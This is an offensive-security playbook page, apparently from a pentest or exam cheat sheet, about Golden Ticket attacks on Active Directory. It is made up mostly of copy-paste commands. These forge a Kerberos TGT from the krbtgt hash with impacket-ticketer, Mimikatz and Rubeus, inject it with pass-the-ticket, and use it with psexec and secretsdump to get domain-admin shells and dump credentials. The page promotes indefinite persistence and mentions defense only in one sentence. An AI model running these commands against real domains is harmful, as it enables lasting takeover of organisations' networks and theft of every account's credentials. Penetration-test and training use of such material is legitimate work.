---
id: golden-ticket
title: Golden Ticket
stage: objective
tags: [windows, ad]
summary: Forge a TGT using the krbtgt hash for indefinite domain access — survives Administrator password changes and lasts 10 years by default.
leads_to:
  - domain-admin
  - silver-ticket
---

## Prerequisites

The `krbtgt` NTLM hash (from DCSync). Domain SID (from secretsdump output or lookupsid). A Windows host with Mimikatz/Rubeus, or impacket-ticketer for Linux-side forgery.

A Golden Ticket is a forged Kerberos TGT signed with the krbtgt key. The KDC trusts any TGT encrypted with this key — so your forged ticket grants access to any service in the domain as any user. It's the highest-value persistence artifact: resetting the krbtgt password twice (back to back, with a replication interval between) is the only defense.

## Quick Win

> Forge with impacket from Linux — no Windows shell needed after getting the krbtgt hash.

```bash
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain $DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec $DOMAIN/Administrator@$DC_IP -k -no-pass
```

## Get Domain SID

> The SID appears in secretsdump output — or use lookupsid if you missed it.

```bash
# From secretsdump output — look for "Domain SID" line
impacket-secretsdump $DOMAIN/user:password@$DC_IP | grep "Domain SID"

# Or via lookupsid (RID 0 = domain object)
impacket-lookupsid $DOMAIN/user:password@$DC_IP 0
```

## Forge with Impacket (Linux)

> Creates a `.ccache` ticket file — use with any impacket tool via KRB5CCNAME.

```bash
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain $DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec $DOMAIN/Administrator@$DC_IP -k -no-pass
impacket-secretsdump $DOMAIN/Administrator@$DC_IP -k -no-pass
```

## Forge with Mimikatz (Windows)

> `/ptt` injects the ticket into the current session immediately.

```powershell
kerberos::golden /user:Administrator /domain:$DOMAIN /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt

# Create file for later import
kerberos::golden /user:Administrator /domain:$DOMAIN /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ticket:golden.kirbi
kerberos::ptt golden.kirbi
```

## Forge with Rubeus (Windows)

> Alternative to Mimikatz — `/ptt` injects into current session.

```powershell
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:$DOMAIN /sid:S-1-5-21-... /user:Administrator /ptt
```

## Leads To

Golden ticket forged → access any service in the domain as DA indefinitely. Useful for persistence after the exam: re-import the ticket any time and regain DA access without re-running the exploit chain. Combine with silver-ticket for stealthy targeted service access that doesn't touch the KDC.
